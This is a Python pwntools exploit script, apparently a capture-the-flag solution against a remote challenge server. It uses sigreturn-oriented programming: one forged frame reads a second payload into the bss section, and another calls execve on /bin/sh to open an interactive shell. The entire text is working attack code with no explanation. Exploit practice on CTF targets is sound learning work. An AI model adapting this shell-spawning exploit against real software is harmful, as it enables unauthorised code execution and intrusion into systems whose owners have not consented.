# method two

from pwn import *


p = remote("node4.buuoj.cn", 28966)

context(os="linux", arch="amd64")

syscall = 0x0400517
sigreturn = p64(0x04004DA)+p64(syscall)
bss_addr = 0x00601030


frame1 = SigreturnFrame()
frame1.rax = 59    # sys_execve
frame1.rdi = bss_addr 
frame1.rsi = 0
frame1.rdx = 0
frame1.rip = syscall

pad1 = b"/bin/sh\x00"+sigreturn+bytes(frame1)


frame2 = SigreturnFrame()
frame2.rax = 0     # sys_read
frame2.rdi = 0
frame2.rsi = bss_addr
frame2.rdx = len(pad1)
frame2.rip = syscall
frame2.rsp = bss_addr+0x8

pad2 = cyclic(0x10)+sigreturn+bytes(frame2)

p.send(pad2)   # read pad1
p.send(pad1)   # sys_execve

p.interactive()

